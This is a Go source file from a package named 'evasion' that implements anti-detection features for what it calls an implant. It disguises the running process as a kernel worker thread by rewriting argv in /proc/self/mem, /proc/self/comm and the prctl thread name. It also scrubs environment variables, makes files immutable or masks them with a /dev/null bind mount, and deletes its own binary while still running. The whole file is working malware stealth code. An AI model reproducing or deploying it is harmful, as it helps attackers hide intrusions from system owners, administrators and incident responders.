//go:build linux && amd64

package evasion

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

// HideProcess applies multiple techniques to disguise the current process.
// It overwrites os.Args[0], writes to /proc/self/comm, cleans the environment,
// and uses prctl PR_SET_NAME to change the kernel-visible thread name.
func HideProcess(masqueradeName string) error {
	var firstErr error

	// 1. Overwrite os.Args[0] and /proc/self/cmdline so Go's runtime
	// and external inspection both report the fake name.
	if len(os.Args) > 0 {
		os.Args[0] = masqueradeName
		MasqueradeArgs([]string{masqueradeName})
	}

	// 2. Write to /proc/self/comm to change the process name visible in ps/top.
	//    The kernel truncates this to 15 characters (TASK_COMM_LEN - 1).
	commName := masqueradeName
	if len(commName) > 15 {
		commName = commName[:15]
	}
	if err := os.WriteFile("/proc/self/comm", []byte(commName), 0644); err != nil {
		if firstErr == nil {
			firstErr = fmt.Errorf("hiding: failed to write /proc/self/comm: %w", err)
		}
	}

	// 3. Use prctl PR_SET_NAME to set the thread name at the kernel level.
	//    This is what shows up in /proc/[pid]/task/[tid]/comm.
	nameBytes := make([]byte, 16)
	copy(nameBytes, commName)
	if _, _, errno := unix.Syscall6(
		unix.SYS_PRCTL,
		unix.PR_SET_NAME,
		uintptr(unsafe.Pointer(&nameBytes[0])),
		0, 0, 0, 0,
	); errno != 0 {
		if firstErr == nil {
			firstErr = fmt.Errorf("hiding: prctl PR_SET_NAME failed: %w", errno)
		}
	}

	// 4. Clean environment variables of anything suspicious.
	if err := CleanEnviron(); err != nil {
		if firstErr == nil {
			firstErr = fmt.Errorf("hiding: CleanEnviron failed: %w", err)
		}
	}

	return firstErr
}

// HideFile attempts to make a file less visible or harder to remove.
// It tries to set the immutable attribute (chattr +i equivalent) and falls
// back to bind-mounting /dev/null over it if that fails.
func HideFile(path string) error {
	// Verify the file exists.
	if _, err := os.Stat(path); err != nil {
		return fmt.Errorf("hiding: cannot stat %s: %w", path, err)
	}

	// Try to set the immutable attribute via ioctl FS_IOC_SETFLAGS.
	if err := setImmutable(path); err == nil {
		return nil
	}

	// Fallback: bind-mount /dev/null over the file to hide its contents.
	// This makes the file appear empty/null to anyone reading it.
	if err := unix.Mount("/dev/null", path, "", unix.MS_BIND, ""); err != nil {
		return fmt.Errorf("hiding: failed to bind-mount over %s: %w", path, err)
	}

	return nil
}

// setImmutable sets the immutable attribute (FS_IMMUTABLE_FL) on a file,
// equivalent to "chattr +i". This prevents deletion, modification, and
// link creation until the attribute is removed.
func setImmutable(path string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	// FS_IOC_GETFLAGS = 0x80086601
	// FS_IOC_SETFLAGS = 0x40086602
	// FS_IMMUTABLE_FL = 0x00000010
	// NOTE: These ioctl values encode sizeof(long)=8 and are x86_64-specific.
	// This file is constrained to linux/amd64 via build tag.
	const (
		fsIOCGetFlags = 0x80086601
		fsIOCSetFlags = 0x40086602
		fsImmutableFL = 0x00000010
	)

	var flags int
	_, _, errno := unix.Syscall(unix.SYS_IOCTL, f.Fd(), fsIOCGetFlags, uintptr(unsafe.Pointer(&flags)))
	if errno != 0 {
		return fmt.Errorf("ioctl GETFLAGS: %w", errno)
	}

	flags |= fsImmutableFL
	_, _, errno = unix.Syscall(unix.SYS_IOCTL, f.Fd(), fsIOCSetFlags, uintptr(unsafe.Pointer(&flags)))
	if errno != 0 {
		return fmt.Errorf("ioctl SETFLAGS: %w", errno)
	}

	return nil
}

// UnlinkSelf deletes the implant's own binary from disk while it continues
// to run. On Linux, a running binary can be deleted because the kernel keeps
// the inode alive as long as any process has it open. The /proc/self/exe
// symlink will show "(deleted)" but the process continues running from the
// in-memory page cache.
func UnlinkSelf() error {
	// Resolve the actual path of our binary via /proc/self/exe.
	exePath, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return fmt.Errorf("hiding: failed to resolve /proc/self/exe: %w", err)
	}

	// Check if already deleted (path ends with " (deleted)").
	if strings.HasSuffix(exePath, " (deleted)") {
		return nil // Already unlinked.
	}

	// Remove the file from the filesystem.
	if err := os.Remove(exePath); err != nil {
		return fmt.Errorf("hiding: failed to unlink %s: %w", exePath, err)
	}

	return nil
}

// MasqueradeArgs overwrites the process's argv in memory to make it appear
// as a different command when inspected via /proc/[pid]/cmdline or ps.
//
// This works by directly writing to the memory region where argv strings
// are stored. The Go runtime's os.Args is also updated for consistency.
//
// Example: MasqueradeArgs([]string{"[kworker/0:2-events]"})
func MasqueradeArgs(args []string) {
	if len(args) == 0 {
		return
	}

	// Build the new cmdline as null-separated bytes (matching /proc/[pid]/cmdline format).
	newCmdline := strings.Join(args, "\x00") + "\x00"

	// Write to /proc/self/cmdline is not directly possible on Linux.
	// Instead, we overwrite the original argv memory region via /proc/self/mem.
	//
	// Read the current cmdline to find the memory boundaries.
	originalCmdline, err := os.ReadFile("/proc/self/cmdline")
	if err != nil || len(originalCmdline) == 0 {
		// Fallback: just update os.Args for Go-level consistency.
		os.Args = args
		return
	}

	// The argv memory region starts at the address stored in /proc/self/stat
	// field 48 (arg_start) and ends at field 49 (arg_end). However, parsing
	// /proc/self/stat is fragile. Instead, we use the environ trick:
	// /proc/self/auxv gives us a pointer near argv.
	//
	// Simpler approach: overwrite via /proc/self/mem using the known cmdline.
	overwriteArgv(originalCmdline, []byte(newCmdline))

	// Update Go's os.Args for internal consistency.
	os.Args = args
}

// overwriteArgv overwrites the original argv region in process memory with
// the new cmdline bytes. It reads /proc/self/stat to find arg_start and
// arg_end addresses, then writes to /proc/self/mem.
func overwriteArgv(original, replacement []byte) {
	// Read /proc/self/stat to find arg_start and arg_end.
	statData, err := os.ReadFile("/proc/self/stat")
	if err != nil {
		return
	}

	// Parse stat fields. The format is:
	// pid (comm) state ppid ... field47=arg_start field48=arg_end ...
	// Fields are space-separated, but comm may contain spaces and is enclosed
	// in parentheses. Find the closing paren first.
	statStr := string(statData)
	closeParen := strings.LastIndex(statStr, ")")
	if closeParen < 0 || closeParen+2 >= len(statStr) {
		return
	}

	// Everything after ") " is the remaining fields starting from field 3.
	remaining := statStr[closeParen+2:]
	fields := strings.Fields(remaining)

	// arg_start is field 48 (0-indexed from the full stat line).
	// After removing pid and comm, field 48 is at index 45 in our remaining fields
	// (field 3 starts at index 0, so field 48 is at index 48-3 = 45).
	if len(fields) < 46 {
		return
	}

	argStartVal, err := strconv.ParseUint(fields[45], 10, 64)
	if err != nil || argStartVal == 0 {
		return
	}
	argEndVal, err := strconv.ParseUint(fields[46], 10, 64)
	if err != nil || argEndVal == 0 {
		return
	}
	argStart := uintptr(argStartVal)
	argEnd := uintptr(argEndVal)

	// Open /proc/self/mem for writing.
	memFile, err := os.OpenFile("/proc/self/mem", os.O_WRONLY, 0)
	if err != nil {
		return
	}
	defer memFile.Close()

	// Prepare the replacement buffer. If it's shorter than the original region,
	// pad with null bytes. If longer, truncate to fit.
	regionSize := int(argEnd - argStart)
	buf := make([]byte, regionSize)
	if len(replacement) > regionSize {
		copy(buf, replacement[:regionSize])
	} else {
		copy(buf, replacement)
		// Remaining bytes are already zero (null padding).
	}

	// Seek to arg_start and write.
	if _, err := memFile.WriteAt(buf, int64(argStart)); err != nil {
		return
	}
}
